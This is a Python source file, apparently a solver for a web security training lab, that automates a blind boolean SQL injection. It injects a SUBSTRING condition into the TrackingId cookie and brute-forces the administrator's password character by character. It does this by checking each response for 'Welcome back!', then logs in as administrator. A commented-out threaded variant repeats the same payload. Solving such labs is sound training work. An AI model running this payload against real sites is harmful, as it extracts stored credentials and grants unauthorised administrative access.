import requests
import string
import time
from rich import print
from threading import Thread, Lock
import halo

from services.sql_injection.base_sql_injection import SQLInjectionBaseSolver

class BlindConditionalResponsesSolver(SQLInjectionBaseSolver):
    def __init__(self, URL):
        super().__init__(URL)

        url = f"{self.url}/login"
        self._request_lab('GET', url)
        self.session = self.html_content.cookies.get('session')
        self.trackingId = self.html_content.cookies.get('TrackingId')
        self.password = ""
        self.listChar = list(string.ascii_lowercase + string.digits)

        

    def solve(self):
        """Solve the lab."""
        self.custom_payload()
        self.request_login(allow_redirects=False)
        self._print_solved()

    
    def custom_payload(self):
        """Build the payload."""
        self.spinner.start()
        self.spinner.text = 'Brute Force Password'
        for idx in range(1, 21):
            for char in self.listChar:
                cookies = {
                    'session': self.session,
                    'TrackingId': f"{self.trackingId}' AND (SELECT SUBSTRING(password,{idx},1) FROM users WHERE username='administrator')='{char}"
                }
                url = f"{self.url}/login"
                self._request_lab('GET', url, cookies=cookies)
                
                if self.html_content.text.find("Welcome back!") != -1:
                    self.spinner.stop()
                    self.spinner.clear()
                    self.password += char
                    self.spinner.text = f"Password: {self.password}"
                    self.spinner.start()
                    break
        
        self.spinner.stop()
        print(f"[bold blue]Password:[/bold blue] {self.password}")
        self.list_users = {"administrator": self.password}

    # def custom_payload(self):
    #     """Build the payload."""
        
    #     def thread_request(idx):
    #         for char in listChar:
    #             cookies = {
    #                 'session': self.session,
    #                 'TrackingId': f"{self.trackingId}' AND (SELECT SUBSTRING(password,{idx},1) FROM users WHERE username='administrator')='{char}"
    #             }
    #             url = f"{self.url}/login"
    #             self._request_lab('GET', url, cookies=cookies)
                
    #             if self.html_content.text.find("Welcome back!") != -1:
    #                 print(f"Found: [green]{char}[/green] at position [blue]{idx}[/blue]")
    #                 with self.lock:
    #                     self.password[idx - 1] = char
    #                 break

    #     listChar = list(string.ascii_lowercase + string.digits)
    #     print(listChar)

    #     threads = []
    #     for idx in range(1, 21):  
    #         time.sleep(3)
    #         thread = Thread(target=thread_request, args=(idx,))
    #         threads.append(thread)
    #         thread.start()

    #     for thread in threads:
    #         thread.join()

    #     print(f"[bold blue]Password:[/bold blue] {"".join(self.password)}")
    #     self.list_users = {"administrator": "".join(self.password)}